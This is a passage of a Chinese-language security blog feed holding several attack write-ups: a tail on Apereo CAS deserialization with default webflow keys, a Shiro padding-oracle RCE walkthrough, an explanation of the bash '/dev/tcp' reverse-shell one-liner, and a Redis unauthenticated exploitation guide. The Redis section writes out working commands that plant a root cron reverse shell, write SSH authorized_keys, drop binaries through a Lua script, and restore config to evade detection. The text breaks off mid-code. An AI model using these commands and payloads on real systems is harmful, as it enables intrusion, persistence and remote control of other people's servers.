class="attr">class</span>=<span class="string">"org.cryptacular.bean.BufferedBlockCipherBean"</span></span></span></span><br><span class="line"><span class="xml">          p:keyAlias="$</span><span class="template-variable">&#123;cas.webflow.keyalias:aes128&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">          p:keyStore-ref="loginFlowCipherKeystore"</span></span><br><span class="line"><span class="xml">          p:keyPassword="$</span><span class="template-variable">&#123;cas.webflow.keypassword:changeit&#125;</span><span class="xml">"&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"nonce"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.generator.sp80038a.RBGNonce"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"blockCipherSpec"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.spec.BufferedBlockCipherSpec"</span></span></span></span><br><span class="line"><span class="xml">                  c:algName="$</span><span class="template-variable">&#123;cas.webflow.cipher.alg:AES&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">                  c:cipherMode="$</span><span class="template-variable">&#123;cas.webflow.cipher.mode:CBC&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">                  c:cipherPadding="$</span><span class="template-variable">&#123;cas.webflow.cipher.padding:PKCS7&#125;</span><span class="xml">" /&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherKeystore"</span> <span class="attr">class</span>=<span class="string">"java.security.KeyStore"</span></span></span></span><br><span class="line"><span class="xml">          factory-bean="loginFlowCipherKeystoreFactory" factory-method="newInstance" /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherKeystoreFactory"</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.bean.KeyStoreFactoryBean"</span></span></span></span><br><span class="line"><span class="xml">          c:type="$</span><span class="template-variable">&#123;cas.webflow.keystore.type:JCEKS&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">          c:password="$</span><span class="template-variable">&#123;cas.webflow.keystore.password:changeit&#125;</span><span class="xml">"&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"resource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.io.URLResource"</span></span></span></span><br><span class="line"><span class="xml">                  c:url="$</span><span class="template-variable">&#123;cas.webflow.keystore:classpath:/etc/keystore.jceks&#125;</span><span class="xml">" /&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>加解密相关的配置会先去配置文件中获取，没有配置密钥信息的会使用jar包默认的密钥信息（默认keystore文件位于spring-webflow-client-repo-1.0.0.jar包当中）。</p><p>由于cas默认配置文件中没有对密钥进行配置，导致我们可以用spring-webflow-client-repo这个jar包中默认的密钥加密序列化数据进行攻击。</p><blockquote><p>如果可以通过其他途径获取密钥同样可以进行攻击。</p></blockquote><p>分析漏洞之余去看了一下导致漏洞的spring-webflow-client-repo这个jar包的github主页<a href="https://github.com/serac/spring-webflow-client-repo" target="_blank" rel="noopener">spring-webflow-client-repo</a></p><p>在主页中作者对这个jar包存在的安全风险做了相关提示</p><p><img src="security.png" alt></p><p>如果开发者在使用一个新的第三方包之前去了解一下作者的介绍完全可以避免这个漏洞的存在。</p><h1 id="漏洞回显利用">漏洞回显利用</h1><p>对于反序列化漏洞单纯利用是比较简单的，这里不做过多介绍。这里重点介绍一下在web环境中有可以回显的exploit。</p><p>关于web回显方法</p><ol><li><a href="https://xz.aliyun.com/t/2272" target="_blank" rel="noopener">报错回显</a></li><li>获取response对象</li><li>目前在研究一种新的通杀回显方法</li></ol><blockquote><p>PS回显了解一下<br><img src="shiro-exp.png" alt></p></blockquote><p>之前在调试&quot;Nexus Repository Manager 3&quot;的表达式执行漏洞时候发现&quot;Thread.currentThread()&quot;的“threadLocals”变量中会保存当前线程相关的一些资源，其中就可能存在response对象。</p><p><img src="threadLocals.png" alt></p><p>这种方法会相对麻烦，因为需要去遍历列表判断是否为目标对象。</p><p>此次回显使用常见的通过静态方法获取response对象，对整个项目进行搜索发现了一个静态方法满足我们的需求</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.webflow</span><span class="selector-class">.context</span><span class="selector-class">.ExternalContextHolder</span><span class="selector-class">.getExternalContext</span>()</span><br></pre></td></tr></table></figure><p>通过这个方法可以获取到当前进行关联的上下文信息，然后通过“getNativeRequest()”方法获取request对象通过getNativeResponse()<br>方法获取response对象。</p><blockquote><p>可以通过 “org.springframework.cglib.core.ReflectUtils.defineClass().newInstance();”这个public方法来加载我们的payload。</p></blockquote><h1 id="enter-hacking">Enter-hacking</h1><blockquote><p>自己动手，丰衣足食。</p></blockquote><p><img src="exploit.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;banner.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;背景介绍&quot;&gt;背景介绍&lt;/h1&gt;
&lt;p&gt;Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是基于此系统二次开发，官网对于漏洞的一个&lt;a href=&quot;https://apereo
      
    
    </summary>
    
    
    
      <category term="apereo cas" scheme="https://www.00theway.org/tags/apereo-cas/"/>
    
      <category term="Java Deserialization" scheme="https://www.00theway.org/tags/Java-Deserialization/"/>
    
      <category term="回显" scheme="https://www.00theway.org/tags/%E5%9B%9E%E6%98%BE/"/>
    
  </entry>
  
  <entry>
    <title>Shiro RCE again (Padding Oracle Attack)</title>
    <link href="https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/"/>
    <id>https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/</id>
    <published>2019-11-13T09:06:22.000Z</published>
    <updated>2020-01-04T09:19:50.436Z</updated>
    
    <content type="html"><![CDATA[<p><img src="title.png" alt></p><h1 id="背景介绍">背景介绍</h1><p>前一段时间Apache发了一个Shiro的漏洞通告<a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">RememberMe Padding Oracle Vulnerability</a>，原因是Shiro使用了AES-128-CBC模式对cookie进行加密，导致恶意用户可以通过padding oracle攻击方式构造序列化数据进行<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">反序列化攻击</a>。</p><p>SHIRO是一个JAVA WEB中使用率很高的权限管理组件，平时HW、攻防演练遇到的也很多，于是拿来研究一下,记录一下。</p><h1 id="漏洞分析">漏洞分析</h1><p>shiro反序列化的攻击流程大家都比较熟悉，然而这次漏洞加入了padding oracle攻击方式比较令人费解，这里首先介绍一下padding oracle的利用方式。</p><h2 id="padding-oracle构造数据">Padding Oracle构造数据</h2><p>网上已经有很多介绍Padding Oracle Attack的原理介绍和利用方法的文章，但是绝大部分都是讲如何获取明文，这就让人很难利用Padding Oracle方式攻击Shiro，Padding Oracle的另外一种利用方法就是构造加密数据，可以参考这篇文章。<br><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></p><p>利用Padding Oracle构造密文</p><p>Select a string, P, that you want to generate ciphertext, C, for<br>Pad the string to be a multiple of the blocksize, using appropriate padding, then split it into blocks numbered from 1 to N<br>Generate a block of random data (CN – ultimately, the final block of ciphertext)<br>For each block of plaintext, starting with the last one…</p><pre><code>* Create a two-block string of ciphertext, C’, by combining an empty block (00000…) with the most recently generated ciphertext block (Cn+1) (or the random one if it’s the first round)* Change the last byte of the empty block until the padding errors go away, then use math (see below for way more detail) to set the last byte to 2 and change the second-last byte till it works. Then change the last two bytes to 3 and figure out the third-last, fourth-last, etc.* After determining the full block, XOR it with the plaintext block Pn to create Cn* Repeat the above process for each block (prepend an empty block to the new ciphertext block, calculate it, etc)</code></pre><p>To put that in English: each block of ciphertext decrypts to an unknown value, then is XOR’d with the previous block of ciphertext. By carefully selecting the previous block, we can control what the next block decrypts to. Even if the next block decrypts to a bunch of garbage, it’s still being XOR’d to a value that we control, and can therefore be set to anything we want.</p><p>以下是对整个过程的一个java实现的核心代码片段，原文看不懂可以结合代码理解</p><p><img src="padding-oracle.png" alt></p><h2 id="shiro中利用">shiro中利用</h2><p>shiro对cookie的处理过程</p><p><img src="shiro-flow.png" alt></p><p>认证失败时会设置deleteMe的cookie</p><p><img src="auth-fail.png" alt></p><p>认证成功则不会设置deleteMe的cookie</p><p><img src="auth-success.png" alt></p><p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用padding oracle构造我们自己的数据（需要学习的另一个知识点是java序列化数据后的脏数据不影响反序列化结果，感谢@imbeee），此时会有两种情况</p><ul><li>构造的数据不能通过字符填充验证，返回deleteme</li><li>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie</li></ul><h1 id="enter-hacking">Enter-hacking</h1><ul><li>ysoserial生成payload</li></ul><p><img src="generate-ser.png" alt></p><ul><li>生成加密后的paylaod</li></ul><p><img src="padding-payload.png" alt></p><ul><li>点击生成计算器</li></ul><p><img src="exploit.png" alt></p><p>这个漏洞利用方式尽然有些鸡肋，但shiro框架是红队评估中很常见，只有了解了漏洞的每一个细节，才能在红队行动中攻城掠地。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;title.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;背景介绍&quot;&gt;背景介绍&lt;/h1&gt;
&lt;p&gt;前一段时间Apache发了一个Shiro的漏洞通告&lt;a href=&quot;https://issues.apache.org/jira/browse/SHIRO-72
      
    
    </summary>
    
    
    
      <category term="shiro" scheme="https://www.00theway.org/tags/shiro/"/>
    
      <category term="rce" scheme="https://www.00theway.org/tags/rce/"/>
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>bash reverse shell</title>
    <link href="https://www.00theway.org/2017/07/11/bash-reverse-shell/"/>
    <id>https://www.00theway.org/2017/07/11/bash-reverse-shell/</id>
    <published>2017-07-11T08:55:23.000Z</published>
    <updated>2020-01-04T09:02:44.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bash-反弹shell">bash 反弹shell</h1><p>下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/host<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然而长时间以来对它的原理一直是似懂非懂，于是就抽时间研究了一下</p><blockquote><p>用到的特殊文件介绍</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/tcp/host/port</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当操作上边文件时， bash 会打开一个与文件关联的socket，读写文件就相当于对socket连接进行读写操作。</p></blockquote><p>在执行一个命令之前，bash shell会把标准输入输出重定向到特殊的文件描述符</p><ul><li>文件描述符0 表示标准输入</li><li>文件描述符1 表示标准输出</li><li>文件描述符2 表示标准错误</li></ul><p>反弹shell语句里边用到了 “&gt;&amp;” 操作符，“&gt;&amp;” 操作符在不同情况下有不通的含义</p><ul><li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li><li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li></ul><p>仅有代码”bash -i”时输入输出状态</p><blockquote><p>0代表标准输入，1代表标准输出，2代表标准错误</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">标准输入、标准输出和标准错误</span> <span class="comment">全部指向shell（此状态定义为状态A）</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">0</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">1</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> </span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">2</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span>  <span class="comment">shell</span> <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br></pre></td></tr></table></figure><p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+           +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p><p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象，具体大家可以看一下视频，然后自己测试一下。</p><p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p><blockquote><p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |\</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+ \</span><br><span class="line">                       \</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>命令”bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p><h2 id="参考文档">参考文档</h2><p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a><br><a href="http://wiki.bash-hackers.org/howto/redirection_tutorial" target="_blank" rel="noopener">http://wiki.bash-hackers.org/howto/redirection_tutorial</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;bash-反弹shell&quot;&gt;bash 反弹shell&lt;/h1&gt;
&lt;p&gt;下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell&lt;/p&gt;
&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
    
      <category term="bash" scheme="https://www.00theway.org/tags/bash/"/>
    
      <category term="reverse shell" scheme="https://www.00theway.org/tags/reverse-shell/"/>
    
  </entry>
  
  <entry>
    <title>redis unauthenticated exploit</title>
    <link href="https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/"/>
    <id>https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/</id>
    <published>2017-03-27T08:35:33.000Z</published>
    <updated>2020-01-04T08:56:23.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p><ul><li><p>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.</p></li><li><p>AOF 持久化记录服务器执行的所有写操作命令.</p><blockquote><p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p></blockquote></li></ul><blockquote><p>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p></blockquote><h1 id="常见利用方式">常见利用方式</h1><h2 id="root权限">root权限</h2><ul><li>直接写计划任务</li></ul><blockquote><p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p></blockquote><p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为linux计划任务目录</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/var/spool/cron/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为root，以root身份执行计划任务</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'root'</span></span><br><span class="line"><span class="comment">#删除所有数据库的所有key</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#设置写入的内容，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，此处可以直接调用lua语句。</span></span><br><span class="line">eval <span class="string">"redis.call('set','cron',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del cron</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写ssh pub key(前提是目标服务器允许使用key登录)</li></ul><p>基本语句与写计划任务相同，直接调用lua语句写入ssh key前后的换行符</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为.ssh</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/root/.ssh/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为authorized_keys</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'authorized_keys'</span></span><br><span class="line"><span class="comment">#清空数据库</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#写入ssh pub key的内容</span></span><br><span class="line">eval <span class="string">"redis.call('set','ssh',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'ssh pub key'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del ssh</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</li></ul><p>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">hex2bin</span><span class="params">(hexstr)</span></span></span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(hexstr) - <span class="number">1</span>, <span class="number">2</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> doublebytestr = <span class="built_in">string</span>.<span class="built_in">sub</span>(hexstr, i, i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">local</span> n = <span class="built_in">tonumber</span>(doublebytestr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n <span class="keyword">then</span></span><br><span class="line">            str = str .. <span class="string">'\00'</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = str .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"%c"</span>, n)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> dir = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dir'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dir'</span>,<span class="string">'/tmp/'</span>)</span><br><span class="line"><span class="keyword">local</span> dbfilename = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dbfilename'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dbfilename'</span>,<span class="string">'t'</span>)</span><br><span class="line"><span class="keyword">local</span> rdbcompress = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'rdbcompression'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'rdbcompression'</span>,<span class="string">'no'</span>)</span><br><span class="line">redis.call(<span class="string">'flushall'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> data = <span class="string">'1a2b3c4d5e6f1223344556677890aa'</span></span><br><span class="line">redis.call(<span class="string">'set'</span>,<span class="string">'data'</span>,hex2bin(<span class="string">'0a7c7c7c'</span>..data..<span class="string">'7c7c7c0a'</span>))</span><br><span class="line"><span class="keyword">local</span> rst = &#123;&#125;</span><br><span class="line">rst[<span class="number">1</span>] = <span class="string">'server default config'</span></span><br><span class="line">rst[<span class="number">2</span>] = <span class="string">'dir:'</span>..dir[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">3</span>] = <span class="string">'dbfilename:'</span>..dbfilename[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">4</span>] = <span class="string">'rdbcompression:'</span>..rdbcompress[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> rst</span><br></pre></td></tr></table></figure><p>保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli <span class="comment">--eval a.lua -h *.*.*.*</span></span><br></pre></td></tr></table></figure><p>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 